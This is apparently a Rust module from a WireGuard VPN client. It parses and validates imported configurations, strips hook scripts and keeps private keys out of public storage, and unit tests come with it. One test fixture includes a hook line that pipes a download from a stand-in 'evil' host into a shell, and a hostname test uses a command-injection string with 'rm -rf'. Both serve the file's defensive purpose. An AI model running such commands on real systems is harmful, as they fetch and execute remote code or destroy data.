//! WireGuard `.conf` parsing, validation and sanitisation.
//!
//! Imported configuration is treated as untrusted input: it is parsed into
//! typed data, every value is validated, hook scripts are stripped (they are
//! never executed), and anything unknown is rejected. Error messages never
//! contain key material.

use crate::keys::{PublicKey, SecretKey};
use ipnet::IpNet;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::fmt::{self, Write as _};
use std::net::{IpAddr, SocketAddr};
use std::str::FromStr;
use zeroize::Zeroizing;

pub const MAX_CONFIG_BYTES: usize = 64 * 1024;
pub const MAX_PEERS: usize = 256;
pub const MAX_ALLOWED_IPS_PER_PEER: usize = 1024;
pub const MAX_ADDRESSES: usize = 16;
pub const MAX_DNS: usize = 8;

#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ConfigError {
    #[error("configuration is larger than {MAX_CONFIG_BYTES} bytes")]
    TooLarge,
    #[error("configuration contains binary or control characters")]
    ControlCharacters,
    #[error("line {line}: {msg}")]
    Line { line: usize, msg: String },
    #[error("{0}")]
    Invalid(String),
}

fn lerr(line: usize, msg: impl Into<String>) -> ConfigError {
    ConfigError::Line { line, msg: msg.into() }
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(tag = "kind", content = "value", rename_all = "lowercase")]
pub enum Host {
    Ip(IpAddr),
    Name(String),
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct Endpoint {
    pub host: Host,
    pub port: u16,
}

impl fmt::Display for Endpoint {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match &self.host {
            Host::Ip(IpAddr::V6(a)) => write!(f, "[{a}]:{}", self.port),
            Host::Ip(IpAddr::V4(a)) => write!(f, "{a}:{}", self.port),
            Host::Name(n) => write!(f, "{n}:{}", self.port),
        }
    }
}

pub fn is_valid_hostname(s: &str) -> bool {
    let s = s.strip_suffix('.').unwrap_or(s);
    if s.is_empty() || s.len() > 253 {
        return false;
    }
    s.split('.').all(|label| {
        !label.is_empty()
            && label.len() <= 63
            && !label.starts_with('-')
            && !label.ends_with('-')
            && label.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
    }) && !s.bytes().all(|b| b.is_ascii_digit() || b == b'.')
}

impl FromStr for Endpoint {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, String> {
        let s = s.trim();
        let (host, port) = if let Some(rest) = s.strip_prefix('[') {
            let (h, p) = rest
                .split_once("]:")
                .ok_or("IPv6 endpoint must look like [addr]:port")?;
            let ip: std::net::Ipv6Addr = h.parse().map_err(|_| "invalid IPv6 address")?;
            (Host::Ip(IpAddr::V6(ip)), p)
        } else {
            let (h, p) = s.rsplit_once(':').ok_or("endpoint must include a port")?;
            if h.contains(':') {
                return Err("IPv6 endpoints must be wrapped in brackets".into());
            }
            let host = match h.parse::<IpAddr>() {
                Ok(ip) => Host::Ip(ip),
                Err(_) if is_valid_hostname(h) => Host::Name(h.to_ascii_lowercase()),
                Err(_) => return Err("invalid endpoint host".into()),
            };
            (host, p)
        };
        let port: u16 = port.parse().map_err(|_| "invalid endpoint port")?;
        if port == 0 {
            return Err("endpoint port must not be 0".into());
        }
        Ok(Endpoint { host, port })
    }
}

/// Interface section. Contains the private key.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct InterfaceConfig {
    pub private_key: SecretKey,
    pub addresses: Vec<IpNet>,
    pub dns: Vec<IpAddr>,
    pub dns_search: Vec<String>,
    pub mtu: Option<u16>,
    pub listen_port: Option<u16>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PeerConfig {
    pub public_key: PublicKey,
    pub preshared_key: Option<SecretKey>,
    pub allowed_ips: Vec<IpNet>,
    pub endpoint: Option<Endpoint>,
    pub persistent_keepalive: Option<u16>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct WgConfig {
    pub interface: InterfaceConfig,
    pub peers: Vec<PeerConfig>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParseOutcome {
    pub config: WgConfig,
    pub warnings: Vec<String>,
}

/// The non-secret projection of a config, safe to store in SQLite and show in the UI.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PublicConfig {
    pub interface_public_key: PublicKey,
    pub addresses: Vec<IpNet>,
    pub dns: Vec<IpAddr>,
    pub dns_search: Vec<String>,
    pub mtu: Option<u16>,
    pub listen_port: Option<u16>,
    pub peers: Vec<PublicPeer>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PublicPeer {
    pub public_key: PublicKey,
    pub has_preshared_key: bool,
    pub allowed_ips: Vec<IpNet>,
    pub endpoint: Option<Endpoint>,
    pub persistent_keepalive: Option<u16>,
}

/// Secret material, stored only in the OS secret store.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ProfileSecrets {
    pub private_key: SecretKey,
    /// Pre-shared keys keyed by peer public key.
    pub preshared_keys: Vec<(PublicKey, SecretKey)>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub struct Families {
    pub ipv4: bool,
    pub ipv6: bool,
}

#[derive(PartialEq)]
enum Section {
    None,
    Interface,
    Peer,
}

fn split_list(v: &str) -> impl Iterator<Item = &str> {
    v.split(',').map(str::trim).filter(|s| !s.is_empty())
}

fn parse_ipnet(s: &str) -> Option<IpNet> {
    if let Ok(n) = s.parse::<IpNet>() {
        return Some(n);
    }
    s.parse::<IpAddr>().ok().map(IpNet::from)
}

/// Parse and validate a wg-quick style configuration.
pub fn parse(text: &str) -> Result<ParseOutcome, ConfigError> {
    if text.len() > MAX_CONFIG_BYTES {
        return Err(ConfigError::TooLarge);
    }
    if text
        .chars()
        .any(|c| c.is_control() && c != '\n' && c != '\r' && c != '\t')
    {
        return Err(ConfigError::ControlCharacters);
    }
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);

    let mut warnings = Vec::new();
    let mut section = Section::None;
    let mut seen_interface = false;

    let mut private_key: Option<SecretKey> = None;
    let mut addresses = Vec::new();
    let mut dns = Vec::new();
    let mut dns_search = Vec::new();
    let mut mtu = None;
    let mut listen_port = None;

    struct PeerBuilder {
        line: usize,
        public_key: Option<PublicKey>,
        preshared_key: Option<SecretKey>,
        allowed_ips: Vec<IpNet>,
        endpoint: Option<Endpoint>,
        keepalive: Option<u16>,
    }
    let mut peers: Vec<PeerBuilder> = Vec::new();
    let mut stripped_hooks = HashSet::new();

    for (idx, raw) in text.lines().enumerate() {
        let n = idx + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            match line.to_ascii_lowercase().as_str() {
                "[interface]" => {
                    if seen_interface {
                        return Err(lerr(n, "duplicate [Interface] section"));
                    }
                    seen_interface = true;
                    section = Section::Interface;
                }
                "[peer]" => {
                    if peers.len() >= MAX_PEERS {
                        return Err(lerr(n, format!("more than {MAX_PEERS} peers")));
                    }
                    section = Section::Peer;
                    peers.push(PeerBuilder {
                        line: n,
                        public_key: None,
                        preshared_key: None,
                        allowed_ips: Vec::new(),
                        endpoint: None,
                        keepalive: None,
                    });
                }
                _ => return Err(lerr(n, "unknown section header")),
            }
            continue;
        }
        if section == Section::None {
            // Nothing before the first section header is valid: say so plainly.
            return Err(lerr(
                n,
                "this does not look like a WireGuard configuration — it must start with an [Interface] section",
            ));
        }
        let (key, value) = line
            .split_once('=')
            .ok_or_else(|| lerr(n, "expected a setting in the form `Key = Value`"))?;
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();

        match section {
            Section::None => unreachable!("handled before splitting the line"),
            Section::Interface => match key.as_str() {
                "privatekey" => {
                    if private_key.is_some() {
                        return Err(lerr(n, "duplicate PrivateKey"));
                    }
                    private_key = Some(SecretKey::parse(value).map_err(|e| lerr(n, format!("PrivateKey: {e}")))?);
                }
                "address" => {
                    for a in split_list(value) {
                        let net = parse_ipnet(a).ok_or_else(|| lerr(n, format!("invalid Address `{a}`")))?;
                        addresses.push(net);
                    }
                }
                "dns" => {
                    for d in split_list(value) {
                        if let Ok(ip) = d.parse::<IpAddr>() {
                            dns.push(ip);
                        } else if is_valid_hostname(d) {
                            dns_search.push(d.to_ascii_lowercase());
                        } else {
                            return Err(lerr(n, format!("invalid DNS entry `{d}`")));
                        }
                    }
                }
                "mtu" => {
                    let m: u16 = value.parse().map_err(|_| lerr(n, "invalid MTU"))?;
                    if !(576..=9200).contains(&m) {
                        return Err(lerr(n, "MTU must be between 576 and 9200"));
                    }
                    mtu = Some(m);
                }
                "listenport" => {
                    let p: u16 = value.parse().map_err(|_| lerr(n, "invalid ListenPort"))?;
                    if (1..1024).contains(&p) {
                        warnings.push(format!(
                            "Ignored ListenPort {p}: privileged ports are not used for client tunnels (a random port is chosen)."
                        ));
                    } else {
                        listen_port = (p != 0).then_some(p);
                    }
                }
                "preup" | "postup" | "predown" | "postdown" => {
                    if stripped_hooks.insert(key.clone()) {
                        warnings.push(format!(
                            "Removed `{key}` script: Alizy never executes commands from configuration files."
                        ));
                    }
                }
                "table" | "fwmark" | "saveconfig" => {
                    warnings.push(format!("Ignored `{key}`: Alizy manages routing and marks itself."));
                }
                other => return Err(lerr(n, format!("unknown Interface setting `{other}`"))),
            },
            Section::Peer => {
                let p = peers.last_mut().expect("peer section has a builder");
                match key.as_str() {
                    "publickey" => {
                        if p.public_key.is_some() {
                            return Err(lerr(n, "duplicate PublicKey in peer"));
                        }
                        p.public_key = Some(PublicKey::parse(value).map_err(|e| lerr(n, format!("PublicKey: {e}")))?);
                    }
                    "presharedkey" => {
                        p.preshared_key =
                            Some(SecretKey::parse(value).map_err(|e| lerr(n, format!("PresharedKey: {e}")))?);
                    }
                    "allowedips" => {
                        for a in split_list(value) {
                            let net =
                                parse_ipnet(a).ok_or_else(|| lerr(n, format!("invalid AllowedIPs entry `{a}`")))?;
                            if net.trunc() != net {
                                warnings.push(format!(
                                    "AllowedIPs `{a}` has host bits set; normalised to `{}`.",
                                    net.trunc()
                                ));
                            }
                            p.allowed_ips.push(net.trunc());
                        }
                        if p.allowed_ips.len() > MAX_ALLOWED_IPS_PER_PEER {
                            return Err(lerr(n, "too many AllowedIPs entries"));
                        }
                    }
                    "endpoint" => {
                        p.endpoint = Some(
                            value
                                .parse::<Endpoint>()
                                .map_err(|e| lerr(n, format!("Endpoint: {e}")))?,
                        );
                    }
                    "persistentkeepalive" => {
                        p.keepalive = if value.eq_ignore_ascii_case("off") {
                            None
                        } else {
                            let k: u16 = value.parse().map_err(|_| lerr(n, "invalid PersistentKeepalive"))?;
                            (k != 0).then_some(k)
                        };
                    }
                    other => return Err(lerr(n, format!("unknown Peer setting `{other}`"))),
                }
            }
        }
    }

    if !seen_interface {
        return Err(ConfigError::Invalid("missing [Interface] section".into()));
    }
    let private_key = private_key.ok_or_else(|| ConfigError::Invalid("[Interface] has no PrivateKey".into()))?;
    if addresses.is_empty() {
        return Err(ConfigError::Invalid("[Interface] has no Address".into()));
    }
    if addresses.len() > MAX_ADDRESSES {
        return Err(ConfigError::Invalid("too many interface addresses".into()));
    }
    if dns.len() > MAX_DNS {
        return Err(ConfigError::Invalid("too many DNS servers".into()));
    }
    if peers.is_empty() {
        return Err(ConfigError::Invalid("configuration has no [Peer]".into()));
    }

    let own_pub = private_key.public_key();
    let mut seen_peers = HashSet::new();
    let mut out_peers = Vec::with_capacity(peers.len());
    for p in peers {
        let pk = p.public_key.ok_or_else(|| lerr(p.line, "peer has no PublicKey"))?;
        if pk == own_pub {
            return Err(lerr(p.line, "peer PublicKey equals this interface's own key"));
        }
        if !seen_peers.insert(pk) {
            return Err(lerr(p.line, "duplicate peer PublicKey"));
        }
        if p.allowed_ips.is_empty() {
            warnings.push(format!(
                "Peer at line {} has no AllowedIPs and will not receive traffic.",
                p.line
            ));
        }
        if p.endpoint.is_none() {
            warnings.push(format!(
                "Peer at line {} has no Endpoint; it can only accept incoming connections.",
                p.line
            ));
        }
        out_peers.push(PeerConfig {
            public_key: pk,
            preshared_key: p.preshared_key,
            allowed_ips: p.allowed_ips,
            endpoint: p.endpoint,
            persistent_keepalive: p.keepalive,
        });
    }
    if out_peers.iter().all(|p| p.endpoint.is_none()) {
        return Err(ConfigError::Invalid(
            "no peer has an Endpoint; Alizy is a client and needs at least one".into(),
        ));
    }

    Ok(ParseOutcome {
        config: WgConfig {
            interface: InterfaceConfig {
                private_key,
                addresses,
                dns,
                dns_search,
                mtu,
                listen_port,
            },
            peers: out_peers,
        },
        warnings,
    })
}

impl WgConfig {
    pub fn split(&self) -> (PublicConfig, ProfileSecrets) {
        let public = PublicConfig {
            interface_public_key: self.interface.private_key.public_key(),
            addresses: self.interface.addresses.clone(),
            dns: self.interface.dns.clone(),
            dns_search: self.interface.dns_search.clone(),
            mtu: self.interface.mtu,
            listen_port: self.interface.listen_port,
            peers: self
                .peers
                .iter()
                .map(|p| PublicPeer {
                    public_key: p.public_key,
                    has_preshared_key: p.preshared_key.is_some(),
                    allowed_ips: p.allowed_ips.clone(),
                    endpoint: p.endpoint.clone(),
                    persistent_keepalive: p.persistent_keepalive,
                })
                .collect(),
        };
        let secrets = ProfileSecrets {
            private_key: self.interface.private_key.clone(),
            preshared_keys: self
                .peers
                .iter()
                .filter_map(|p| p.preshared_key.clone().map(|k| (p.public_key, k)))
                .collect(),
        };
        (public, secrets)
    }

    pub fn join(public: &PublicConfig, secrets: &ProfileSecrets) -> Result<Self, ConfigError> {
        if secrets.private_key.public_key() != public.interface_public_key {
            return Err(ConfigError::Invalid(
                "stored private key does not match the profile".into(),
            ));
        }
        let mut peers = Vec::with_capacity(public.peers.len());
        for p in &public.peers {
            let psk = secrets
                .preshared_keys
                .iter()
                .find(|(k, _)| *k == p.public_key)
                .map(|(_, v)| v.clone());
            if p.has_preshared_key && psk.is_none() {
                return Err(ConfigError::Invalid("stored pre-shared key is missing".into()));
            }
            peers.push(PeerConfig {
                public_key: p.public_key,
                preshared_key: psk,
                allowed_ips: p.allowed_ips.clone(),
                endpoint: p.endpoint.clone(),
                persistent_keepalive: p.persistent_keepalive,
            });
        }
        Ok(WgConfig {
            interface: InterfaceConfig {
                private_key: secrets.private_key.clone(),
                addresses: public.addresses.clone(),
                dns: public.dns.clone(),
                dns_search: public.dns_search.clone(),
                mtu: public.mtu,
                listen_port: public.listen_port,
            },
            peers,
        })
    }

    /// Serialise back to wg-quick format (sanitised: no hooks, canonical keys).
    pub fn to_wg_quick(&self, include_secrets: bool) -> Zeroizing<String> {
        let mut s = Zeroizing::new(String::new());
        let i = &self.interface;
        s.push_str("[Interface]\n");
        if include_secrets {
            let _ = writeln!(s, "PrivateKey = {}", i.private_key.expose_base64().as_str());
        } else {
            s.push_str("PrivateKey = <redacted>\n");
        }
        let _ = writeln!(s, "Address = {}", join(&i.addresses));
        if !i.dns.is_empty() || !i.dns_search.is_empty() {
            let mut all: Vec<String> = i.dns.iter().map(ToString::to_string).collect();
            all.extend(i.dns_search.iter().cloned());
            let _ = writeln!(s, "DNS = {}", all.join(", "));
        }
        if let Some(m) = i.mtu {
            let _ = writeln!(s, "MTU = {m}");
        }
        if let Some(p) = i.listen_port {
            let _ = writeln!(s, "ListenPort = {p}");
        }
        for p in &self.peers {
            s.push_str("\n[Peer]\n");
            let _ = writeln!(s, "PublicKey = {}", p.public_key);
            if let Some(k) = &p.preshared_key {
                if include_secrets {
                    let _ = writeln!(s, "PresharedKey = {}", k.expose_base64().as_str());
                } else {
                    s.push_str("PresharedKey = <redacted>\n");
                }
            }
            if !p.allowed_ips.is_empty() {
                let _ = writeln!(s, "AllowedIPs = {}", join(&p.allowed_ips));
            }
            if let Some(e) = &p.endpoint {
                let _ = writeln!(s, "Endpoint = {e}");
            }
            if let Some(k) = p.persistent_keepalive {
                let _ = writeln!(s, "PersistentKeepalive = {k}");
            }
        }
        s
    }

    /// Render the minimal config consumed by `wg setconf` (no wg-quick keys).
    /// `endpoints[i]` must be the resolved address for peer `i`.
    pub fn to_wg_setconf(&self, endpoints: &[Option<SocketAddr>], fwmark: u32) -> Zeroizing<String> {
        let mut s = Zeroizing::new(String::new());
        s.push_str("[Interface]\n");
        let _ = writeln!(
            s,
            "PrivateKey = {}",
            self.interface.private_key.expose_base64().as_str()
        );
        let _ = writeln!(s, "FwMark = {fwmark:#x}");
        if let Some(p) = self.interface.listen_port.filter(|p| *p >= 1024) {
            let _ = writeln!(s, "ListenPort = {p}");
        }
        for (idx, p) in self.peers.iter().enumerate() {
            s.push_str("\n[Peer]\n");
            let _ = writeln!(s, "PublicKey = {}", p.public_key);
            if let Some(k) = &p.preshared_key {
                let _ = writeln!(s, "PresharedKey = {}", k.expose_base64().as_str());
            }
            if !p.allowed_ips.is_empty() {
                let _ = writeln!(s, "AllowedIPs = {}", join(&p.allowed_ips));
            }
            if let Some(Some(ep)) = endpoints.get(idx) {
                let _ = writeln!(s, "Endpoint = {ep}");
            }
            if let Some(k) = p.persistent_keepalive {
                let _ = writeln!(s, "PersistentKeepalive = {k}");
            }
        }
        s
    }
}

impl PublicConfig {
    /// Address families the tunnel can carry (has an address AND a route).
    pub fn tunnel_families(&self) -> Families {
        let has = |v4: bool| {
            self.addresses.iter().any(|a| matches!(a, IpNet::V4(_)) == v4)
                && self
                    .peers
                    .iter()
                    .flat_map(|p| &p.allowed_ips)
                    .any(|a| matches!(a, IpNet::V4(_)) == v4)
        };
        Families {
            ipv4: has(true),
            ipv6: has(false),
        }
    }

    /// True when the profile routes all traffic of the given family.
    pub fn is_full_tunnel(&self, v4: bool) -> bool {
        self.peers
            .iter()
            .flat_map(|p| &p.allowed_ips)
            .any(|a| a.prefix_len() == 0 && matches!(a, IpNet::V4(_)) == v4)
    }

    pub fn endpoints(&self) -> Vec<Endpoint> {
        self.peers.iter().filter_map(|p| p.endpoint.clone()).collect()
    }
}

fn join<T: ToString>(v: &[T]) -> String {
    v.iter().map(ToString::to_string).collect::<Vec<_>>().join(", ")
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    pub const PRIV: &str = "dwdtCnMYpX08FsFyUbJmRd9ML4frwJkqsXf7pR25LCo=";
    pub const PEER: &str = "3p7bfXt9wbTTW2HC7OQ1Nz+DQ8hbeGdNrfx+FG+IK08=";
    pub const PSK: &str = "XDnhSwHmuXzMhW9ffSo/KQPg8f8ihQ0p0AeHPd5L6kI=";

    pub fn sample() -> String {
        format!(
            "# provider config\n[Interface]\nPrivateKey = {PRIV}\nAddress = 10.66.0.2/32, fd00:66::2/128\nDNS = 10.66.0.1, corp.example\nMTU = 1420\nPostUp = curl evil | sh\n\n[Peer]\nPublicKey = {PEER}\nPresharedKey = {PSK}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = vpn.example.com:51820\nPersistentKeepalive = 25\n"
        )
    }

    #[test]
    fn parses_valid_config_and_strips_hooks() {
        let out = parse(&sample()).unwrap();
        let c = &out.config;
        assert_eq!(c.interface.addresses.len(), 2);
        assert_eq!(c.interface.dns, vec!["10.66.0.1".parse::<IpAddr>().unwrap()]);
        assert_eq!(c.interface.dns_search, vec!["corp.example"]);
        assert_eq!(c.interface.mtu, Some(1420));
        assert_eq!(c.peers.len(), 1);
        assert_eq!(
            c.peers[0].endpoint.as_ref().unwrap().host,
            Host::Name("vpn.example.com".into())
        );
        assert!(out.warnings.iter().any(|w| w.contains("postup")));
        let rendered = c.to_wg_quick(true);
        assert!(!rendered.to_lowercase().contains("postup"));
        assert!(!rendered.contains("curl"));
    }

    #[test]
    fn roundtrip_through_wg_quick() {
        let c = parse(&sample()).unwrap().config;
        let again = parse(&c.to_wg_quick(true)).unwrap().config;
        assert_eq!(c, again);
    }

    #[test]
    fn split_and_join_roundtrip() {
        let c = parse(&sample()).unwrap().config;
        let (public, secrets) = c.split();
        let json = serde_json::to_string(&public).unwrap();
        assert!(!json.contains(PRIV));
        assert!(!json.contains(PSK));
        assert_eq!(WgConfig::join(&public, &secrets).unwrap(), c);
    }

    #[test]
    fn redacted_export_hides_keys() {
        let c = parse(&sample()).unwrap().config;
        let s = c.to_wg_quick(false);
        assert!(!s.contains(PRIV));
        assert!(!s.contains(PSK));
    }

    #[test]
    fn rejects_invalid_configs() {
        let cases = [
            ("", "missing [Interface]"),
            ("[Interface]\nAddress = 10.0.0.2/32\n", "no PrivateKey"),
            (
                &format!("[Interface]\nPrivateKey = {PRIV}\n[Peer]\nPublicKey = {PEER}\nEndpoint=1.2.3.4:1\n"),
                "no Address",
            ),
            (
                &format!("[Interface]\nPrivateKey = {PRIV}\nAddress = 10.0.0.2\n"),
                "no [Peer]",
            ),
            (
                "[Interface]\nPrivateKey = nope\nAddress=10.0.0.2\n",
                "PrivateKey",
            ),
            (
                &format!("[Interface]\nPrivateKey = {PRIV}\nAddress=10.0.0.2\nFoo = bar\n"),
                "unknown Interface setting",
            ),
            (
                &format!("[Interface]\nPrivateKey = {PRIV}\nAddress=10.0.0.2\n[Peer]\nPublicKey={PEER}\nEndpoint = ::1:51820\n"),
                "brackets",
            ),
            (
                &format!("[Interface]\nPrivateKey = {PRIV}\nAddress=10.0.0.2\n[Peer]\nPublicKey={PEER}\nEndpoint = bad_host!:1\n"),
                "invalid endpoint host",
            ),
            (
                &format!("[Interface]\nPrivateKey = {PRIV}\nAddress=10.0.0.2\n[Peer]\nPublicKey={PEER}\nAllowedIPs=0.0.0.0/0\n"),
                "no peer has an Endpoint",
            ),
            (
                &format!("[Interface]\nPrivateKey = {PRIV}\nAddress=10.0.0.2\n[Peer]\nPublicKey={PEER}\nEndpoint=1.1.1.1:1\n[Peer]\nPublicKey={PEER}\nEndpoint=1.1.1.1:2\n"),
                "duplicate peer",
            ),
            ("[Interface]\0", "control characters"),
            ("hello", "does not look like a WireGuard configuration"),
            ("Address = 10.0.0.2", "must start with an [Interface] section"),
        ];
        for (text, expect) in cases {
            let err = parse(text).unwrap_err().to_string();
            assert!(err.contains(expect), "expected `{expect}` in `{err}`");
            assert!(!err.contains(PRIV), "error leaked key");
        }
    }

    #[test]
    fn rejects_oversized_input() {
        let big = "#".repeat(MAX_CONFIG_BYTES + 1);
        assert_eq!(parse(&big), Err(ConfigError::TooLarge));
    }

    #[test]
    fn families_and_full_tunnel() {
        let c = parse(&sample()).unwrap().config;
        let (p, _) = c.split();
        assert_eq!(p.tunnel_families(), Families { ipv4: true, ipv6: true });
        assert!(p.is_full_tunnel(true) && p.is_full_tunnel(false));
    }

    #[test]
    fn setconf_contains_only_wg_keys() {
        let c = parse(&sample()).unwrap().config;
        let ep: SocketAddr = "198.51.100.7:51820".parse().unwrap();
        let s = c.to_wg_setconf(&[Some(ep)], 0x4a5a);
        assert!(s.contains("Endpoint = 198.51.100.7:51820"));
        assert!(s.contains("FwMark = 0x4a5a"));
        for banned in ["Address", "DNS", "MTU", "PostUp"] {
            assert!(!s.contains(banned), "{banned} must not reach wg setconf");
        }
    }

    #[test]
    fn hostname_validation() {
        assert!(is_valid_hostname("vpn.example.com"));
        assert!(!is_valid_hostname("-bad.example"));
        assert!(!is_valid_hostname("a b"));
        assert!(!is_valid_hostname("1.2.3"));
        assert!(!is_valid_hostname("x;rm -rf"));
    }
}
